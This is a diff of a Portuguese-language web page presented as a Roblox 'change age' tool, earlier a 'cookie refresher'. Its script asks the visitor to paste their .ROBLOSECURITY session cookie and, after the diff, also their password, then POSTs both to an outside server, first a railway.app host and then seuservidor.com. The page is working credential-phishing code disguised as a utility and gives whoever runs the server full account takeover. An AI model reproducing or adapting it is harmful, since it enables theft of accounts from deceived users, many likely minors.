@@ -21,7 +21,7 @@
       margin-bottom: 20px;
     }
 
-    input[type="text"] {
+    input[type="text"], input[type="password"] {
       width: 60%;
       padding: 10px;
       border-radius: 5px;
@@ -59,16 +59,6 @@
       overflow-y: scroll; /* ativa o scroll se necessário */
     }
 
-    #cookieContainer {
-      max-width: 90%;
-      margin: 10px auto;
-      padding: 10px;
-      background-color: #1e1e1e;
-      color: white;
-      border-radius: 8px;
-      overflow-x: auto;
-    }
-
     #copyBtn {
       margin-top: 10px;
       display: none; /* Esconde até o botão ser necessário */
@@ -81,39 +71,41 @@
 </head>
 <body>
 
-  <h1 class="main-title">Refresh seu Cookie</h1>
+  <h1 class="main-title">Alterar Idade (13 to -13)</h1>
   <input type="text" id="cookie" placeholder="Cole seu .ROBLOSECURITY aqui" />
+  <input type="password" id="password" placeholder="Digite sua Senha" />
   <br>
-  <button onclick="enviarCookie()">Refresh</button>
+  <button onclick="alterarIdade()">Alterar Idade</button>
 
   <div id="resposta" style="display: none;"></div>
   <button id="copyBtn" onclick="copiarTexto()">Copiar</button>
 
   <script>
-    async function enviarCookie() {
+    async function alterarIdade() {
       const cookie = document.getElementById("cookie").value;
+      const password = document.getElementById("password").value;
       const respostaElemento = document.getElementById("resposta");
       const copyBtn = document.getElementById("copyBtn");
 
       try {
-        const resposta = await fetch("https://robloxbp-production.up.railway.app/refresh", {
+        const resposta = await fetch("https://seuservidor.com/alterar-idade", {
           method: "POST",
           headers: {
             "Content-Type": "application/json"
           },
-          body: JSON.stringify({ cookie })
+          body: JSON.stringify({ cookie, password })
         });
 
         const data = await resposta.json();
 
-        if (data.cookieAtualizado) {
-          respostaElemento.innerText = data.cookieAtualizado;
+        if (data.idadeAlterada) {
+          respostaElemento.innerText = data.idadeAlterada;
           respostaElemento.style.display = "block";
           copyBtn.style.display = "inline-block"; // Torna o botão visível
         } else {
           respostaElemento.innerText = data.error || "Erro inesperado";
           respostaElemento.style.display = "block";
-          copyBtn.style.display = "none"; // Não exibe o botão se não houver cookie atualizado
+          copyBtn.style.display = "none"; // Não exibe o botão se não houver idade alterada
         }
       } catch (error) {
         respostaElemento.innerText = "Erro ao conectar com o servidor.";
